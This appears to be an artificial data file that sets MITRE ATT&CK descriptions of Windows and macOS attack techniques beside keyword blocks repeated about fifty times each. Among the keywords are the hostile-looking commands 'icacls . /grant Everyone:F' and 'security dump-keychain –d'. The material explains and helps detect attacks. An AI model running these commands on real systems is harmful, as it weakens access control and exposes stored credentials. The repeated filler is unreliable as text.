Adversaries may abuse features of Winlogon to execute DLLs and/or executables when a user logs in. Winlogon.exe is a Windows component responsible for actions at logon/logoff as well as the secure attention sequence (SAS) triggered by Ctrl-Alt-Delete. Registry entries in <code>HKLM\Software[\\Wow6432Node\\]\Microsoft\Windows NT\CurrentVersion\Winlogon\</code> and <code>HKCU\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\</code> are used to manage additional helper programs and functionalities that support Winlogon.(Citation: Cylance Reg Persistence Sept 2013) 

Malicious modifications to these Registry keys may cause Winlogon to load and execute malicious DLLs and/or executables. Specifically, the following subkeys have been known to be possibly vulnerable to abuse: (Citation: Cylance Reg Persistence Sept 2013)

* Winlogon\Notify - points to notification package DLLs that handle Winlogon events
* Winlogon\Userinit - points to userinit.exe, the user initialization program executed when a user logs on
* Winlogon\Shell - points to explorer.exe, the system shell executed when a user logs on

Adversaries may take advantage of these features to repeatedly execute malicious code and establish persistence.
chmod 
chmod 
chmod 
chmod 
chmod 
chmod 
chmod 
chmod 
chmod 
chmod 
chmod 
chmod 
chmod 
chmod 
chmod 
chmod 
chmod 
chmod 
chmod 
chmod 
chmod 
chmod 
chmod 
chmod 
chmod 
chmod 
chmod 
chmod 
chmod 
chmod 
chmod 
chmod 
chmod 
chmod 
chmod 
chmod 
chmod 
chmod 
chmod 
chmod 
chmod 
chmod 
chmod 
chmod 
chmod 
chmod 
chmod 
chmod 
chmod 
chmod 
 attrib +h 
 attrib +h 
 attrib +h 
 attrib +h 
 attrib +h 
 attrib +h 
 attrib +h 
 attrib +h 
 attrib +h 
 attrib +h 
 attrib +h 
 attrib +h 
 attrib +h 
 attrib +h 
 attrib +h 
 attrib +h 
 attrib +h 
 attrib +h 
 attrib +h 
 attrib +h 
 attrib +h 
 attrib +h 
 attrib +h 
 attrib +h 
 attrib +h 
 attrib +h 
 attrib +h 
 attrib +h 
 attrib +h 
 attrib +h 
 attrib +h 
 attrib +h 
 attrib +h 
 attrib +h 
 attrib +h 
 attrib +h 
 attrib +h 
 attrib +h 
 attrib +h 
 attrib +h 
 attrib +h 
 attrib +h 
 attrib +h 
 attrib +h 
 attrib +h 
 attrib +h 
 attrib +h 
 attrib +h 
 attrib +h 
 attrib +h 
 icacls . /grant Everyone:F /T /C /Q
 icacls . /grant Everyone:F /T /C /Q
 icacls . /grant Everyone:F /T /C /Q
 icacls . /grant Everyone:F /T /C /Q
 icacls . /grant Everyone:F /T /C /Q
 icacls . /grant Everyone:F /T /C /Q
 icacls . /grant Everyone:F /T /C /Q
 icacls . /grant Everyone:F /T /C /Q
 icacls . /grant Everyone:F /T /C /Q
 icacls . /grant Everyone:F /T /C /Q
 icacls . /grant Everyone:F /T /C /Q
 icacls . /grant Everyone:F /T /C /Q
 icacls . /grant Everyone:F /T /C /Q
 icacls . /grant Everyone:F /T /C /Q
 icacls . /grant Everyone:F /T /C /Q
 icacls . /grant Everyone:F /T /C /Q
 icacls . /grant Everyone:F /T /C /Q
 icacls . /grant Everyone:F /T /C /Q
 icacls . /grant Everyone:F /T /C /Q
 icacls . /grant Everyone:F /T /C /Q
 icacls . /grant Everyone:F /T /C /Q
 icacls . /grant Everyone:F /T /C /Q
 icacls . /grant Everyone:F /T /C /Q
 icacls . /grant Everyone:F /T /C /Q
 icacls . /grant Everyone:F /T /C /Q
 icacls . /grant Everyone:F /T /C /Q
 icacls . /grant Everyone:F /T /C /Q
 icacls . /grant Everyone:F /T /C /Q
 icacls . /grant Everyone:F /T /C /Q
 icacls . /grant Everyone:F /T /C /Q
 icacls . /grant Everyone:F /T /C /Q
 icacls . /grant Everyone:F /T /C /Q
 icacls . /grant Everyone:F /T /C /Q
 icacls . /grant Everyone:F /T /C /Q
 icacls . /grant Everyone:F /T /C /Q
 icacls . /grant Everyone:F /T /C /Q
 icacls . /grant Everyone:F /T /C /Q
 icacls . /grant Everyone:F /T /C /Q
 icacls . /grant Everyone:F /T /C /Q
 icacls . /grant Everyone:F /T /C /Q
 icacls . /grant Everyone:F /T /C /Q
 icacls . /grant Everyone:F /T /C /Q
 icacls . /grant Everyone:F /T /C /Q
 icacls . /grant Everyone:F /T /C /Q
 icacls . /grant Everyone:F /T /C /Q
 icacls . /grant Everyone:F /T /C /Q
 icacls . /grant Everyone:F /T /C /Q
 icacls . /grant Everyone:F /T /C /Q
 icacls . /grant Everyone:F /T /C /Q
 icacls . /grant Everyone:F /T /C /Q
Adversaries may modify file or directory permissions/attributes to evade access control lists (ACLs) and access protected files.(Citation: Hybrid Analysis Icacls1 June 2018)(Citation: Hybrid Analysis Icacls2 May 2018) File and directory permissions are commonly managed by ACLs configured by the file or directory owner, or users with the appropriate permissions. File and directory ACL implementations vary by platform, but generally explicitly designate which users or groups can perform which actions (read, write, execute, etc.).

Modifications may include changing specific access rights, which may require taking ownership of a file or directory and/or elevated permissions depending on the file or directory’s existing permissions. This may enable malicious activity such as modifying, replacing, or deleting specific files or directories. Specific file and directory modifications may be a required step for many techniques, such as establishing Persistence via [Accessibility Features](https://attack.mitre.org/techniques/T1546/008), [Boot or Logon Initialization Scripts](https://attack.mitre.org/techniques/T1037), [Unix Shell Configuration Modification](https://attack.mitre.org/techniques/T1546/004), or tainting/hijacking other instrumental binary/configuration files via [Hijack Execution Flow](https://attack.mitre.org/techniques/T1574).

Adversaries may also change permissions of symbolic links. For example, malware (particularly ransomware) may modify symbolic links and associated settings to enable access to files from local shortcuts with remote paths.(Citation: new_rust_based_ransomware)(Citation: bad_luck_blackcat)(Citation: falconoverwatch_blackcat_attack)(Citation: blackmatter_blackcat)(Citation: fsutil_behavior) 
API hooking 
API hooking 
API hooking 
API hooking 
API hooking 
API hooking 
API hooking 
API hooking 
API hooking 
API hooking 
API hooking 
API hooking 
API hooking 
API hooking 
API hooking 
API hooking 
API hooking 
API hooking 
API hooking 
API hooking 
API hooking 
API hooking 
API hooking 
API hooking 
API hooking 
API hooking 
API hooking 
API hooking 
API hooking 
API hooking 
API hooking 
API hooking 
API hooking 
API hooking 
API hooking 
API hooking 
API hooking 
API hooking 
API hooking 
API hooking 
API hooking 
API hooking 
API hooking 
API hooking 
API hooking 
API hooking 
API hooking 
API hooking 
API hooking 
API hooking 
SetWindowsHookEx
SetWindowsHookEx
SetWindowsHookEx
SetWindowsHookEx
SetWindowsHookEx
SetWindowsHookEx
SetWindowsHookEx
SetWindowsHookEx
SetWindowsHookEx
SetWindowsHookEx
SetWindowsHookEx
SetWindowsHookEx
SetWindowsHookEx
SetWindowsHookEx
SetWindowsHookEx
SetWindowsHookEx
SetWindowsHookEx
SetWindowsHookEx
SetWindowsHookEx
SetWindowsHookEx
SetWindowsHookEx
SetWindowsHookEx
SetWindowsHookEx
SetWindowsHookEx
SetWindowsHookEx
SetWindowsHookEx
SetWindowsHookEx
SetWindowsHookEx
SetWindowsHookEx
SetWindowsHookEx
SetWindowsHookEx
SetWindowsHookEx
SetWindowsHookEx
SetWindowsHookEx
SetWindowsHookEx
SetWindowsHookEx
SetWindowsHookEx
SetWindowsHookEx
SetWindowsHookEx
SetWindowsHookEx
SetWindowsHookEx
SetWindowsHookEx
SetWindowsHookEx
SetWindowsHookEx
SetWindowsHookEx
SetWindowsHookEx
SetWindowsHookEx
SetWindowsHookEx
SetWindowsHookEx
SetWindowsHookEx
Adversaries may hook into Windows application programming interface (API) functions to collect user credentials. Malicious hooking mechanisms may capture API calls that include parameters that reveal user authentication credentials.(Citation: Microsoft TrojanSpy:Win32/Ursnif.gen!I Sept 2017) Unlike [Keylogging](https://attack.mitre.org/techniques/T1056/001),  this technique focuses specifically on API functions that include parameters that reveal user credentials. Hooking involves redirecting calls to these functions and can be implemented via:

* **Hooks procedures**, which intercept and execute designated code in response to events such as messages, keystrokes, and mouse inputs.(Citation: Microsoft Hook Overview)(Citation: Elastic Process Injection July 2017)
* **Import address table (IAT) hooking**, which use modifications to a process’s IAT, where pointers to imported API functions are stored.(Citation: Elastic Process Injection July 2017)(Citation: Adlice Software IAT Hooks Oct 2014)(Citation: MWRInfoSecurity Dynamic Hooking 2015)
* **Inline hooking**, which overwrites the first bytes in an API function to redirect code flow.(Citation: Elastic Process Injection July 2017)(Citation: HighTech Bridge Inline Hooking Sept 2011)(Citation: MWRInfoSecurity Dynamic Hooking 2015)

UEFI BIOS 
UEFI BIOS 
UEFI BIOS 
UEFI BIOS 
UEFI BIOS 
UEFI BIOS 
UEFI BIOS 
UEFI BIOS 
UEFI BIOS 
UEFI BIOS 
UEFI BIOS 
UEFI BIOS 
UEFI BIOS 
UEFI BIOS 
UEFI BIOS 
UEFI BIOS 
UEFI BIOS 
UEFI BIOS 
UEFI BIOS 
UEFI BIOS 
UEFI BIOS 
UEFI BIOS 
UEFI BIOS 
UEFI BIOS 
UEFI BIOS 
UEFI BIOS 
UEFI BIOS 
UEFI BIOS 
UEFI BIOS 
UEFI BIOS 
UEFI BIOS 
UEFI BIOS 
UEFI BIOS 
UEFI BIOS 
UEFI BIOS 
UEFI BIOS 
UEFI BIOS 
UEFI BIOS 
UEFI BIOS 
UEFI BIOS 
UEFI BIOS 
UEFI BIOS 
UEFI BIOS 
UEFI BIOS 
UEFI BIOS 
UEFI BIOS 
UEFI BIOS 
UEFI BIOS 
UEFI BIOS 
UEFI BIOS 
Adversaries may modify system firmware to persist on systems.The BIOS (Basic Input/Output System) and The Unified Extensible Firmware Interface (UEFI) or Extensible Firmware Interface (EFI) are examples of system firmware that operate as the software interface between the operating system and hardware of a computer. (Citation: Wikipedia BIOS) (Citation: Wikipedia UEFI) (Citation: About UEFI)

System firmware like BIOS and (U)EFI underly the functionality of a computer and may be modified by an adversary to perform or assist in malicious activity. Capabilities exist to overwrite the system firmware, which may give sophisticated adversaries a means to install malicious firmware updates as a means of persistence on a system that may be difficult to detect.
lsass.exe 
lsass.exe 
lsass.exe 
lsass.exe 
lsass.exe 
lsass.exe 
lsass.exe 
lsass.exe 
lsass.exe 
lsass.exe 
lsass.exe 
lsass.exe 
lsass.exe 
lsass.exe 
lsass.exe 
lsass.exe 
lsass.exe 
lsass.exe 
lsass.exe 
lsass.exe 
lsass.exe 
lsass.exe 
lsass.exe 
lsass.exe 
lsass.exe 
lsass.exe 
lsass.exe 
lsass.exe 
lsass.exe 
lsass.exe 
lsass.exe 
lsass.exe 
lsass.exe 
lsass.exe 
lsass.exe 
lsass.exe 
lsass.exe 
lsass.exe 
lsass.exe 
lsass.exe 
lsass.exe 
lsass.exe 
lsass.exe 
lsass.exe 
lsass.exe 
lsass.exe 
lsass.exe 
lsass.exe 
lsass.exe 
lsass.exe 
Adversaries may modify or add LSASS drivers to obtain persistence on compromised systems. The Windows security subsystem is a set of components that manage and enforce the security policy for a computer or domain. The Local Security Authority (LSA) is the main component responsible for local security policy and user authentication. The LSA includes multiple dynamic link libraries (DLLs) associated with various other security functions, all of which run in the context of the LSA Subsystem Service (LSASS) lsass.exe process.(Citation: Microsoft Security Subsystem)

Adversaries may target LSASS drivers to obtain persistence. By either replacing or adding illegitimate drivers (e.g., [Hijack Execution Flow](https://attack.mitre.org/techniques/T1574)), an adversary can use LSA operations to continuously execute malicious payloads.
COM and execution in same sentence 
COM and execution in same sentence 
COM and execution in same sentence 
COM and execution in same sentence 
COM and execution in same sentence 
COM and execution in same sentence 
COM and execution in same sentence 
COM and execution in same sentence 
COM and execution in same sentence 
COM and execution in same sentence 
COM and execution in same sentence 
COM and execution in same sentence 
COM and execution in same sentence 
COM and execution in same sentence 
COM and execution in same sentence 
COM and execution in same sentence 
COM and execution in same sentence 
COM and execution in same sentence 
COM and execution in same sentence 
COM and execution in same sentence 
COM and execution in same sentence 
COM and execution in same sentence 
COM and execution in same sentence 
COM and execution in same sentence 
COM and execution in same sentence 
COM and execution in same sentence 
COM and execution in same sentence 
COM and execution in same sentence 
COM and execution in same sentence 
COM and execution in same sentence 
COM and execution in same sentence 
COM and execution in same sentence 
COM and execution in same sentence 
COM and execution in same sentence 
COM and execution in same sentence 
COM and execution in same sentence 
COM and execution in same sentence 
COM and execution in same sentence 
COM and execution in same sentence 
COM and execution in same sentence 
COM and execution in same sentence 
COM and execution in same sentence 
COM and execution in same sentence 
COM and execution in same sentence 
COM and execution in same sentence 
COM and execution in same sentence 
COM and execution in same sentence 
COM and execution in same sentence 
COM and execution in same sentence 
COM and execution in same sentence 
 Invoke-DCOM 
 Invoke-DCOM 
 Invoke-DCOM 
 Invoke-DCOM 
 Invoke-DCOM 
 Invoke-DCOM 
 Invoke-DCOM 
 Invoke-DCOM 
 Invoke-DCOM 
 Invoke-DCOM 
 Invoke-DCOM 
 Invoke-DCOM 
 Invoke-DCOM 
 Invoke-DCOM 
 Invoke-DCOM 
 Invoke-DCOM 
 Invoke-DCOM 
 Invoke-DCOM 
 Invoke-DCOM 
 Invoke-DCOM 
 Invoke-DCOM 
 Invoke-DCOM 
 Invoke-DCOM 
 Invoke-DCOM 
 Invoke-DCOM 
 Invoke-DCOM 
 Invoke-DCOM 
 Invoke-DCOM 
 Invoke-DCOM 
 Invoke-DCOM 
 Invoke-DCOM 
 Invoke-DCOM 
 Invoke-DCOM 
 Invoke-DCOM 
 Invoke-DCOM 
 Invoke-DCOM 
 Invoke-DCOM 
 Invoke-DCOM 
 Invoke-DCOM 
 Invoke-DCOM 
 Invoke-DCOM 
 Invoke-DCOM 
 Invoke-DCOM 
 Invoke-DCOM 
 Invoke-DCOM 
 Invoke-DCOM 
 Invoke-DCOM 
 Invoke-DCOM 
 Invoke-DCOM 
 Invoke-DCOM 
 DCOM 
 DCOM 
 DCOM 
 DCOM 
 DCOM 
 DCOM 
 DCOM 
 DCOM 
 DCOM 
 DCOM 
 DCOM 
 DCOM 
 DCOM 
 DCOM 
 DCOM 
 DCOM 
 DCOM 
 DCOM 
 DCOM 
 DCOM 
 DCOM 
 DCOM 
 DCOM 
 DCOM 
 DCOM 
 DCOM 
 DCOM 
 DCOM 
 DCOM 
 DCOM 
 DCOM 
 DCOM 
 DCOM 
 DCOM 
 DCOM 
 DCOM 
 DCOM 
 DCOM 
 DCOM 
 DCOM 
 DCOM 
 DCOM 
 DCOM 
 DCOM 
 DCOM 
 DCOM 
 DCOM 
 DCOM 
 DCOM 
 DCOM 
 COM execution
 COM execution
 COM execution
 COM execution
 COM execution
 COM execution
 COM execution
 COM execution
 COM execution
 COM execution
 COM execution
 COM execution
 COM execution
 COM execution
 COM execution
 COM execution
 COM execution
 COM execution
 COM execution
 COM execution
 COM execution
 COM execution
 COM execution
 COM execution
 COM execution
 COM execution
 COM execution
 COM execution
 COM execution
 COM execution
 COM execution
 COM execution
 COM execution
 COM execution
 COM execution
 COM execution
 COM execution
 COM execution
 COM execution
 COM execution
 COM execution
 COM execution
 COM execution
 COM execution
 COM execution
 COM execution
 COM execution
 COM execution
 COM execution
 COM execution
Adversaries may use [Valid Accounts](https://attack.mitre.org/techniques/T1078) to interact with remote machines by taking advantage of Distributed Component Object Model (DCOM). The adversary may then perform actions as the logged-on user.

The Windows Component Object Model (COM) is a component of the native Windows application programming interface (API) that enables interaction between software objects, or executable code that implements one or more interfaces. Through COM, a client object can call methods of server objects, which are typically Dynamic Link Libraries (DLL) or executables (EXE). Distributed COM (DCOM) is transparent middleware that extends the functionality of COM beyond a local computer using remote procedure call (RPC) technology.(Citation: Fireeye Hunting COM June 2019)(Citation: Microsoft COM)

Permissions to interact with local and remote server COM objects are specified by access control lists (ACL) in the Registry.(Citation: Microsoft Process Wide Com Keys) By default, only Administrators may remotely activate and launch COM objects through DCOM.(Citation: Microsoft COM ACL)

Through DCOM, adversaries operating in the context of an appropriately privileged user can remotely obtain arbitrary and even direct shellcode execution through Office applications(Citation: Enigma Outlook DCOM Lateral Movement Nov 2017) as well as other Windows objects that contain insecure methods.(Citation: Enigma MMC20 COM Jan 2017)(Citation: Enigma DCOM Lateral Movement Jan 2017) DCOM can also execute macros in existing documents(Citation: Enigma Excel DCOM Sept 2017) and may also invoke [Dynamic Data Exchange](https://attack.mitre.org/techniques/T1559/002) (DDE) execution directly through a COM created instance of a Microsoft Office application(Citation: Cyberreason DCOM DDE Lateral Movement Nov 2017), bypassing the need for a malicious document. DCOM can be used as a method of remotely interacting with [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047). (Citation: MSDN WMI)
cmstp.exe
cmstp.exe
cmstp.exe
cmstp.exe
cmstp.exe
cmstp.exe
cmstp.exe
cmstp.exe
cmstp.exe
cmstp.exe
cmstp.exe
cmstp.exe
cmstp.exe
cmstp.exe
cmstp.exe
cmstp.exe
cmstp.exe
cmstp.exe
cmstp.exe
cmstp.exe
cmstp.exe
cmstp.exe
cmstp.exe
cmstp.exe
cmstp.exe
cmstp.exe
cmstp.exe
cmstp.exe
cmstp.exe
cmstp.exe
cmstp.exe
cmstp.exe
cmstp.exe
cmstp.exe
cmstp.exe
cmstp.exe
cmstp.exe
cmstp.exe
cmstp.exe
cmstp.exe
cmstp.exe
cmstp.exe
cmstp.exe
cmstp.exe
cmstp.exe
cmstp.exe
cmstp.exe
cmstp.exe
cmstp.exe
cmstp.exe
Adversaries may abuse CMSTP to proxy execution of malicious code. The Microsoft Connection Manager Profile Installer (CMSTP.exe) is a command-line program used to install Connection Manager service profiles. (Citation: Microsoft Connection Manager Oct 2009) CMSTP.exe accepts an installation information file (INF) as a parameter and installs a service profile leveraged for remote access connections.

Adversaries may supply CMSTP.exe with INF files infected with malicious commands. (Citation: Twitter CMSTP Usage Jan 2018) Similar to [Regsvr32](https://attack.mitre.org/techniques/T1218/010) / ”Squiblydoo”, CMSTP.exe may be abused to load and execute DLLs (Citation: MSitPros CMSTP Aug 2017)  and/or COM scriptlets (SCT) from remote servers. (Citation: Twitter CMSTP Jan 2018) (Citation: GitHub Ultimate AppLocker Bypass List) (Citation: Endurant CMSTP July 2018) This execution may also bypass AppLocker and other application control defenses since CMSTP.exe is a legitimate binary that may be signed by Microsoft.

CMSTP.exe can also be abused to [Bypass User Account Control](https://attack.mitre.org/techniques/T1548/002) and execute arbitrary commands from a malicious INF through an auto-elevated COM interface. (Citation: MSitPros CMSTP Aug 2017) (Citation: GitHub Ultimate AppLocker Bypass List) (Citation: Endurant CMSTP July 2018)
environmental keying
environmental keying
environmental keying
environmental keying
environmental keying
environmental keying
environmental keying
environmental keying
environmental keying
environmental keying
environmental keying
environmental keying
environmental keying
environmental keying
environmental keying
environmental keying
environmental keying
environmental keying
environmental keying
environmental keying
environmental keying
environmental keying
environmental keying
environmental keying
environmental keying
environmental keying
environmental keying
environmental keying
environmental keying
environmental keying
environmental keying
environmental keying
environmental keying
environmental keying
environmental keying
environmental keying
environmental keying
environmental keying
environmental keying
environmental keying
environmental keying
environmental keying
environmental keying
environmental keying
environmental keying
environmental keying
environmental keying
environmental keying
environmental keying
environmental keying
Adversaries may use execution guardrails to constrain execution or actions based on adversary supplied and environment specific conditions that are expected to be present on the target. Guardrails ensure that a payload only executes against an intended target and reduces collateral damage from an adversary’s campaign.(Citation: FireEye Kevin Mandia Guardrails) Values an adversary can provide about a target system or environment to use as guardrails may include specific network share names, attached physical devices, files, joined Active Directory (AD) domains, and local/external IP addresses.(Citation: FireEye Outlook Dec 2019)

Guardrails can be used to prevent exposure of capabilities in environments that are not intended to be compromised or operated within. This use of guardrails is distinct from typical [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497). While use of [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497) may involve checking for known sandbox values and continuing with execution only if there is no match, the use of guardrails will involve checking for an expected target-specific value and only continuing with execution if there is such a match.
COM + hijack in same sentence
COM + hijack in same sentence
COM + hijack in same sentence
COM + hijack in same sentence
COM + hijack in same sentence
COM + hijack in same sentence
COM + hijack in same sentence
COM + hijack in same sentence
COM + hijack in same sentence
COM + hijack in same sentence
COM + hijack in same sentence
COM + hijack in same sentence
COM + hijack in same sentence
COM + hijack in same sentence
COM + hijack in same sentence
COM + hijack in same sentence
COM + hijack in same sentence
COM + hijack in same sentence
COM + hijack in same sentence
COM + hijack in same sentence
COM + hijack in same sentence
COM + hijack in same sentence
COM + hijack in same sentence
COM + hijack in same sentence
COM + hijack in same sentence
COM + hijack in same sentence
COM + hijack in same sentence
COM + hijack in same sentence
COM + hijack in same sentence
COM + hijack in same sentence
COM + hijack in same sentence
COM + hijack in same sentence
COM + hijack in same sentence
COM + hijack in same sentence
COM + hijack in same sentence
COM + hijack in same sentence
COM + hijack in same sentence
COM + hijack in same sentence
COM + hijack in same sentence
COM + hijack in same sentence
COM + hijack in same sentence
COM + hijack in same sentence
COM + hijack in same sentence
COM + hijack in same sentence
COM + hijack in same sentence
COM + hijack in same sentence
COM + hijack in same sentence
COM + hijack in same sentence
COM + hijack in same sentence
COM + hijack in same sentence
Adversaries may establish persistence by executing malicious content triggered by hijacked references to Component Object Model (COM) objects. COM is a system within Windows to enable interaction between software components through the operating system.(Citation: Microsoft Component Object Model)  References to various COM objects are stored in the Registry. 

Adversaries can use the COM system to insert malicious code that can be executed in place of legitimate software through hijacking the COM references and relationships as a means for persistence. Hijacking a COM object requires a change in the Registry to replace a reference to a legitimate system component which may cause that component to not work when executed. When that system component is executed through normal system operation the adversary's code will be executed instead.(Citation: GDATA COM Hijacking) An adversary is likely to hijack objects that are used frequently enough to maintain a consistent level of persistence, but are unlikely to break noticeable functionality within the system as to avoid system instability that could lead to detection. 
sticky key 
sticky key 
sticky key 
sticky key 
sticky key 
sticky key 
sticky key 
sticky key 
sticky key 
sticky key 
sticky key 
sticky key 
sticky key 
sticky key 
sticky key 
sticky key 
sticky key 
sticky key 
sticky key 
sticky key 
sticky key 
sticky key 
sticky key 
sticky key 
sticky key 
sticky key 
sticky key 
sticky key 
sticky key 
sticky key 
sticky key 
sticky key 
sticky key 
sticky key 
sticky key 
sticky key 
sticky key 
sticky key 
sticky key 
sticky key 
sticky key 
sticky key 
sticky key 
sticky key 
sticky key 
sticky key 
sticky key 
sticky key 
sticky key 
sticky key 
C:\Windows\System32\sethc.exe 
C:\Windows\System32\sethc.exe 
C:\Windows\System32\sethc.exe 
C:\Windows\System32\sethc.exe 
C:\Windows\System32\sethc.exe 
C:\Windows\System32\sethc.exe 
C:\Windows\System32\sethc.exe 
C:\Windows\System32\sethc.exe 
C:\Windows\System32\sethc.exe 
C:\Windows\System32\sethc.exe 
C:\Windows\System32\sethc.exe 
C:\Windows\System32\sethc.exe 
C:\Windows\System32\sethc.exe 
C:\Windows\System32\sethc.exe 
C:\Windows\System32\sethc.exe 
C:\Windows\System32\sethc.exe 
C:\Windows\System32\sethc.exe 
C:\Windows\System32\sethc.exe 
C:\Windows\System32\sethc.exe 
C:\Windows\System32\sethc.exe 
C:\Windows\System32\sethc.exe 
C:\Windows\System32\sethc.exe 
C:\Windows\System32\sethc.exe 
C:\Windows\System32\sethc.exe 
C:\Windows\System32\sethc.exe 
C:\Windows\System32\sethc.exe 
C:\Windows\System32\sethc.exe 
C:\Windows\System32\sethc.exe 
C:\Windows\System32\sethc.exe 
C:\Windows\System32\sethc.exe 
C:\Windows\System32\sethc.exe 
C:\Windows\System32\sethc.exe 
C:\Windows\System32\sethc.exe 
C:\Windows\System32\sethc.exe 
C:\Windows\System32\sethc.exe 
C:\Windows\System32\sethc.exe 
C:\Windows\System32\sethc.exe 
C:\Windows\System32\sethc.exe 
C:\Windows\System32\sethc.exe 
C:\Windows\System32\sethc.exe 
C:\Windows\System32\sethc.exe 
C:\Windows\System32\sethc.exe 
C:\Windows\System32\sethc.exe 
C:\Windows\System32\sethc.exe 
C:\Windows\System32\sethc.exe 
C:\Windows\System32\sethc.exe 
C:\Windows\System32\sethc.exe 
C:\Windows\System32\sethc.exe 
C:\Windows\System32\sethc.exe 
C:\Windows\System32\sethc.exe 
 C:\Windows\System32\utilman.exe
 C:\Windows\System32\utilman.exe
 C:\Windows\System32\utilman.exe
 C:\Windows\System32\utilman.exe
 C:\Windows\System32\utilman.exe
 C:\Windows\System32\utilman.exe
 C:\Windows\System32\utilman.exe
 C:\Windows\System32\utilman.exe
 C:\Windows\System32\utilman.exe
 C:\Windows\System32\utilman.exe
 C:\Windows\System32\utilman.exe
 C:\Windows\System32\utilman.exe
 C:\Windows\System32\utilman.exe
 C:\Windows\System32\utilman.exe
 C:\Windows\System32\utilman.exe
 C:\Windows\System32\utilman.exe
 C:\Windows\System32\utilman.exe
 C:\Windows\System32\utilman.exe
 C:\Windows\System32\utilman.exe
 C:\Windows\System32\utilman.exe
 C:\Windows\System32\utilman.exe
 C:\Windows\System32\utilman.exe
 C:\Windows\System32\utilman.exe
 C:\Windows\System32\utilman.exe
 C:\Windows\System32\utilman.exe
 C:\Windows\System32\utilman.exe
 C:\Windows\System32\utilman.exe
 C:\Windows\System32\utilman.exe
 C:\Windows\System32\utilman.exe
 C:\Windows\System32\utilman.exe
 C:\Windows\System32\utilman.exe
 C:\Windows\System32\utilman.exe
 C:\Windows\System32\utilman.exe
 C:\Windows\System32\utilman.exe
 C:\Windows\System32\utilman.exe
 C:\Windows\System32\utilman.exe
 C:\Windows\System32\utilman.exe
 C:\Windows\System32\utilman.exe
 C:\Windows\System32\utilman.exe
 C:\Windows\System32\utilman.exe
 C:\Windows\System32\utilman.exe
 C:\Windows\System32\utilman.exe
 C:\Windows\System32\utilman.exe
 C:\Windows\System32\utilman.exe
 C:\Windows\System32\utilman.exe
 C:\Windows\System32\utilman.exe
 C:\Windows\System32\utilman.exe
 C:\Windows\System32\utilman.exe
 C:\Windows\System32\utilman.exe
 C:\Windows\System32\utilman.exe
Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by accessibility features. Windows contains accessibility features that may be launched with a key combination before a user has logged in (ex: when the user is on the Windows logon screen). An adversary can modify the way these programs are launched to get a command prompt or backdoor without logging in to the system.

Two common accessibility programs are <code>C:\Windows\System32\sethc.exe</code>, launched when the shift key is pressed five times and <code>C:\Windows\System32\utilman.exe</code>, launched when the Windows + U key combination is pressed. The sethc.exe program is often referred to as "sticky keys", and has been used by adversaries for unauthenticated access through a remote desktop login screen. (Citation: FireEye Hikit Rootkit)

Depending on the version of Windows, an adversary may take advantage of these features in different ways. Common methods used by adversaries include replacing accessibility feature binaries or pointers/references to these binaries in the Registry. In newer versions of Windows, the replaced binary needs to be digitally signed for x64 systems, the binary must reside in <code>%systemdir%\</code>, and it must be protected by Windows File or Resource Protection (WFP/WRP). (Citation: DEFCON2016 Sticky Keys) The [Image File Execution Options Injection](https://attack.mitre.org/techniques/T1546/012) debugger method was likely discovered as a potential workaround because it does not require the corresponding accessibility feature binary to be replaced.

For simple binary replacement on Windows XP and later as well as and Windows Server 2003/R2 and later, for example, the program (e.g., <code>C:\Windows\System32\utilman.exe</code>) may be replaced with "cmd.exe" (or another program that provides backdoor access). Subsequently, pressing the appropriate key combination at the login screen while sitting at the keyboard or when connected over [Remote Desktop Protocol](https://attack.mitre.org/techniques/T1021/001) will cause the replaced file to be executed with SYSTEM privileges. (Citation: Tilbury 2014)

Other accessibility features exist that may also be leveraged in a similar fashion: (Citation: DEFCON2016 Sticky Keys)(Citation: Narrator Accessibility Abuse)

* On-Screen Keyboard: <code>C:\Windows\System32\osk.exe</code>
* Magnifier: <code>C:\Windows\System32\Magnify.exe</code>
* Narrator: <code>C:\Windows\System32\Narrator.exe</code>
* Display Switcher: <code>C:\Windows\System32\DisplaySwitch.exe</code>
* App Switcher: <code>C:\Windows\System32\AtBroker.exe</code>
collect + keychain in same sentence
collect + keychain in same sentence
collect + keychain in same sentence
collect + keychain in same sentence
collect + keychain in same sentence
collect + keychain in same sentence
collect + keychain in same sentence
collect + keychain in same sentence
collect + keychain in same sentence
collect + keychain in same sentence
collect + keychain in same sentence
collect + keychain in same sentence
collect + keychain in same sentence
collect + keychain in same sentence
collect + keychain in same sentence
collect + keychain in same sentence
collect + keychain in same sentence
collect + keychain in same sentence
collect + keychain in same sentence
collect + keychain in same sentence
collect + keychain in same sentence
collect + keychain in same sentence
collect + keychain in same sentence
collect + keychain in same sentence
collect + keychain in same sentence
collect + keychain in same sentence
collect + keychain in same sentence
collect + keychain in same sentence
collect + keychain in same sentence
collect + keychain in same sentence
collect + keychain in same sentence
collect + keychain in same sentence
collect + keychain in same sentence
collect + keychain in same sentence
collect + keychain in same sentence
collect + keychain in same sentence
collect + keychain in same sentence
collect + keychain in same sentence
collect + keychain in same sentence
collect + keychain in same sentence
collect + keychain in same sentence
collect + keychain in same sentence
collect + keychain in same sentence
collect + keychain in same sentence
collect + keychain in same sentence
collect + keychain in same sentence
collect + keychain in same sentence
collect + keychain in same sentence
collect + keychain in same sentence
collect + keychain in same sentence
Adversaries may acquire credentials from Keychain. Keychain (or Keychain Services) is the macOS credential management system that stores account names, passwords, private keys, certificates, sensitive application data, payment data, and secure notes. There are three types of Keychains: Login Keychain, System Keychain, and Local Items (iCloud) Keychain. The default Keychain is the Login Keychain, which stores user passwords and information. The System Keychain stores items accessed by the operating system, such as items shared among users on a host. The Local Items (iCloud) Keychain is used for items synced with Apple’s iCloud service. 

Keychains can be viewed and edited through the Keychain Access application or using the command-line utility <code>security</code>. Keychain files are located in <code>~/Library/Keychains/</code>, <code>/Library/Keychains/</code>, and <code>/Network/Library/Keychains/</code>.(Citation: Keychain Services Apple)(Citation: Keychain Decryption Passware)(Citation: OSX Keychain Schaumann)

Adversaries may gather user credentials from Keychain storage/memory. For example, the command <code>security dump-keychain –d</code> will dump all Login Keychain credentials from <code>~/Library/Keychains/login.keychain-db</code>. Adversaries may also directly read Login Keychain credentials from the <code>~/Library/Keychains/login.keychain</code> file. Both methods require a password, where the default password for the Login Keychain is the current user’s password to login to the macOS host.(Citation: External to DA, the OS X Way)(Citation: Empire Keychain Decrypt)  
mshta
mshta
mshta
mshta
mshta
mshta
mshta
mshta
mshta
mshta
mshta
